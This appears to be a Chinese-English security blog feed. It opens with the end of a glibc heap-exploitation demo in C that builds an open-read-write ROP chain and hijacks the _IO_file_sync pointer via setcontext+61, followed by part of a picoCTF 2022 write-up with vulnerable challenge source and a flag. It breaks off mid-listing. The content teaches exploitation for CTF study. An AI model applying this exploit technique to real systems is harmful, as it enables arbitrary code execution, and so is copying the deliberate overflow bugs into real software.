<span class="comment">// setcontext + 61</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mThen we get address of setcontext+61, which has offset of 0x53A30 + 61: %#zx\n\033[0m&quot;</span>, magic_gadget);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32m然后我们获取到setcontext+61的地址，其相对于libc基址的偏移为0x53A30 + 61: %#zx\n\033[0m&quot;</span>, magic_gadget);</span><br><span class="line">    <span class="type">size_t</span> _IO_helper_jumps = libc_base + <span class="number">0x215A00</span>; <span class="comment">// _IO_helper_jumps</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mNext is the address of _IO_helper_jumps, which has offset of 0x215A00: %#zx\n\033[0m&quot;</span>, _IO_helper_jumps);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32m接下来是_IO_helper_jumps的地址，其相对于libc基址的偏移为0x215A00: %#zx\n\033[0m&quot;</span>, _IO_helper_jumps);</span><br><span class="line">    <span class="type">size_t</span> _IO_file_sync = libc_base + <span class="number">0x216660</span>; <span class="comment">// sync pointer in _IO_file_jumps</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mNext is the address of _IO_file_sync, which has offset of 0x216660: %#zx\n\033[0m&quot;</span>, _IO_file_sync);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32m接下来是_IO_file_sync的地址，其相对于libc基址的偏移为0x216660: %#zx\n\033[0m&quot;</span>, _IO_file_sync);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen let&#x27;s construct our ROP chain of orw. The ROP chain will be placed in bss segment.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们就来构造ROP链，用于orw。ROP链会放在bss段中。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mUseful gadgets:\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m有用的gadget：（不同libc下的偏移可能不同，如果在不同libc下测试注意修改）\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31mpop rax ; ret: %#zx\n\033[0m&quot;</span>, pop_rax_ret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31mpop rdi ; ret: %#zx\n\033[0m&quot;</span>, pop_rdi_ret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31mpop rsi ; ret: %#zx\n\033[0m&quot;</span>, pop_rsi_ret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31msyscall ; ret: %#zx\n\033[0m&quot;</span>, syscall_ret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31mpop rdx ; pop r12 ; ret: %#zx\n\n\033[0m&quot;</span>, pop_rdx_r12);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rax_ret;</span><br><span class="line">    ROP[i++] = <span class="number">2</span>;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)FLAG;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = syscall_ret;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">3</span>;</span><br><span class="line">    ROP[i++] = pop_rdx_r12;</span><br><span class="line">    ROP[i++] = <span class="number">0x100</span>;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)(FLAG + <span class="number">0x10</span>);</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)read;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">1</span>;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)write;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mROP chain constructed, then we need to change the value of [rdx+0xA0] and [rdx+0xA8].\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mROP链构造完成，下面我们需要修改[rdx+0xA0]和[rdx+0xA8]的值了。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mWe need to let [_IO_helper_jumps+0xA0] = ROP chain address, and [_IO_helper_jumps+0xA8] = address of instruction \&quot;ret\&quot;\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m我们需要让[_IO_helper_jumps+0xA0]等于ROP链的地址，[_IO_helper_jumps+0xA8]等于一条ret指令的地址。\&quot;ret\&quot;\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThis is basic knowledge you need to know when using setcontext to pivot your stack.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m这是使用setcontext进行栈迁移的基本操作。\033[0m&quot;</span>);</span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_helper_jumps + <span class="number">0xA0</span>/<span class="number">8</span>) = (<span class="type">size_t</span>)ROP; <span class="comment">// 设置rsp</span></span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_helper_jumps + <span class="number">0xA8</span>/<span class="number">8</span>) = ret; <span class="comment">// 设置rcx 即 程序setcontext运行完后会首先调用的指令地址</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThen we let _IO_file_sync pointer = setcontext + 61.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们让_IO_file_sync指针的值等于setcontext+61，以触发栈迁移。\033[0m&quot;</span>);</span><br><span class="line">    *((<span class="type">size_t</span>*)_IO_file_sync) = magic_gadget; <span class="comment">// 设置fflush(stderr)中调用的指令地址</span></span><br><span class="line">    <span class="comment">// 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mNext we need to change the size of top chunk to let the assert fail.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m然后我们修改top chunk的大小让断言失败。\033[0m&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> *top_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>) + <span class="number">0x18</span>);</span><br><span class="line">    *top_size = (*top_size)&amp;<span class="number">0xFFE</span>; <span class="comment">// top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32mThe last step: malloc a big space.\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m最后一步：malloc一块大空间。\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发assert</span></span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>picoctf-2022部分write-ups</title>
      <link href="/2023/02/28/picoctf-2022%E9%83%A8%E5%88%86write-ups/"/>
      <url>/2023/02/28/picoctf-2022%E9%83%A8%E5%88%86write-ups/</url>
      
        <content type="html"><![CDATA[<p>picoctf 2022刚刚结束，上面的题目非常适合刚刚入门CTF的选手，整体难度很平易近人，这里写一下picoctf 2022我做过的题的Write-up。当然做的最多的还是pwn。</p><h1 id="1-pwn部分"><a href="#1-pwn部分" class="headerlink" title="1. pwn部分"></a>1. pwn部分</h1><p>pwn部分几乎所有题目都给了源码，算是很亲民了。</p><h2 id="1-basic-file-exploit"><a href="#1-basic-file-exploit" class="headerlink" title="1. basic-file-exploit"></a>1. basic-file-exploit</h2><p>只给了源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WAIT 60</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* flag = <span class="string">&quot;[REDACTED]&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> data[<span class="number">10</span>][<span class="number">100</span>];</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> input_lengths[<span class="number">10</span>];</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> inputs = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">tgetinput</span><span class="params">(<span class="type">char</span> *input, <span class="type">unsigned</span> <span class="type">int</span> l)</span></span><br><span class="line">&#123;</span><br><span class="line">    fd_set          input_set;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span>  <span class="title">timeout</span>;</span></span><br><span class="line">    <span class="type">int</span>             ready_for_reading = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>             read_bytes = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( l &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&#x27;l&#x27; for tgetinput must be greater than 0\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* Empty the FD Set */</span></span><br><span class="line">    FD_ZERO(&amp;input_set );</span><br><span class="line">    <span class="comment">/* Listen to the input descriptor */</span></span><br><span class="line">    FD_SET(STDIN_FILENO, &amp;input_set);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Waiting for some seconds */</span></span><br><span class="line">    timeout.tv_sec = WAIT;    <span class="comment">// WAIT seconds</span></span><br><span class="line">    timeout.tv_usec = <span class="number">0</span>;    <span class="comment">// 0 milliseconds</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Listening for input stream for any activity */</span></span><br><span class="line">    ready_for_reading = select(<span class="number">1</span>, &amp;input_set, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;timeout);</span><br><span class="line">    <span class="comment">/* Here, first parameter is number of FDs in the set, </span></span><br><span class="line"><span class="comment">     * second is our FD set for reading,</span></span><br><span class="line"><span class="comment">     * third is the FD set in which any write activity needs to updated,</span></span><br><span class="line"><span class="comment">     * which is not required in this case. </span></span><br><span class="line"><span class="comment">     * Fourth is timeout</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ready_for_reading == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">/* Some error has occured in input */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unable to read your input\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ready_for_reading) &#123;</span><br><span class="line">        read_bytes = read(<span class="number">0</span>, input, l<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span>(input[read_bytes<span class="number">-1</span>]==<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">        --read_bytes;</span><br><span class="line">        input[read_bytes]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(read_bytes==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;No data given.\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-4</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Timed out waiting for user input. Press Ctrl-C to disconnect\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">data_write</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> input[<span class="number">100</span>];</span><br><span class="line">  <span class="type">char</span> len[<span class="number">4</span>];</span><br><span class="line">  <span class="type">long</span> length;</span><br><span class="line">  <span class="type">int</span> r;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter your data:\n&quot;</span>);</span><br><span class="line">  r = tgetinput(input, <span class="number">100</span>);</span><br><span class="line">  <span class="comment">// Timeout on user input</span></span><br><span class="line">  <span class="keyword">if</span>(r == <span class="number">-3</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the length of your data:\n&quot;</span>);</span><br><span class="line">    r = tgetinput(len, <span class="number">4</span>);</span><br><span class="line">    <span class="comment">// Timeout on user input</span></span><br><span class="line">    <span class="keyword">if</span>(r == <span class="number">-3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> ((length = strtol(len, <span class="literal">NULL</span>, <span class="number">10</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Please put in a valid length&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (inputs &gt; <span class="number">10</span>) &#123;</span><br><span class="line">    inputs = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(data[inputs], input);</span><br><span class="line">  input_lengths[inputs] = length;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your entry number is: %d\n&quot;</span>, inputs + <span class="number">1</span>);</span><br><span class="line">  inputs++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">data_read</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> entry[<span class="number">4</span>];</span><br><span class="line">  <span class="type">long</span> entry_number;</span><br><span class="line">  <span class="type">char</span> output[<span class="number">100</span>];</span><br><span class="line">  <span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(output, <span class="string">&#x27;\0&#x27;</span>, <span class="number">100</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please enter the entry number of your data:\n&quot;</span>);</span><br><span class="line">  r = tgetinput(entry, <span class="number">4</span>);</span><br><span class="line">  <span class="comment">// Timeout on user input</span></span><br><span class="line">  <span class="keyword">if</span>(r == <span class="number">-3</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ((entry_number = strtol(entry, <span class="literal">NULL</span>, <span class="number">10</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">    fseek(<span class="built_in">stdin</span>, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  entry_number--;</span><br><span class="line">  <span class="built_in">strncpy</span>(output, data[entry_number], input_lengths[entry_number]);</span><br><span class="line">  <span class="built_in">puts</span>(output);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">  <span class="type">char</span> input[<span class="number">3</span>] = &#123;<span class="string">&#x27;\0&#x27;</span>&#125;;</span><br><span class="line">  <span class="type">long</span> command;</span><br><span class="line">  <span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hi, welcome to my echo chamber!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Type &#x27;1&#x27; to enter a phrase into our database&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Type &#x27;2&#x27; to echo a phrase in our database&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Type &#x27;3&#x27; to exit the program&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;   </span><br><span class="line">    r = tgetinput(input, <span class="number">3</span>);</span><br><span class="line">    <span class="comment">// Timeout on user input</span></span><br><span class="line">    <span class="keyword">if</span>(r == <span class="number">-3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((command = strtol(input, <span class="literal">NULL</span>, <span class="number">10</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Please put in a valid number&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="number">1</span>) &#123;</span><br><span class="line">      data_write();</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Write successful, would you like to do anything else?&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="number">2</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (inputs == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No data yet&quot;</span>);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      data_read();</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Read successful, would you like to do anything else?&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="number">3</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Please type either 1, 2 or 3&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Maybe breaking boundaries elsewhere will be helpful&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需要写入一次之后读取位置0即可拿到flag。<br>picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_9F68795F}</p><h2 id="2-buffer-overflow-0"><a href="#2-buffer-overflow-0" class="headerlink" title="2. buffer overflow 0"></a>2. buffer overflow 0</h2><p>源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE_MAX 64</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> flag[FLAGSIZE_MAX];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sigsegv_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *input)</span>&#123;</span><br><span class="line">  <span class="type">char</span> buf2[<span class="number">16</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">  </span><br><span class="line">  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  fgets(flag,FLAGSIZE_MAX,f);</span><br><span class="line">  signal(SIGSEGV, sigsegv_handler); <span class="comment">// Set up signal handler</span></span><br><span class="line">  </span><br><span class="line">  <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">  setresgid(gid, gid, gid);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="type">char</span> buf1[<span class="number">100</span>];</span><br><span class="line">  gets(buf1); </span><br><span class="line">  vuln(buf1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The program will exit 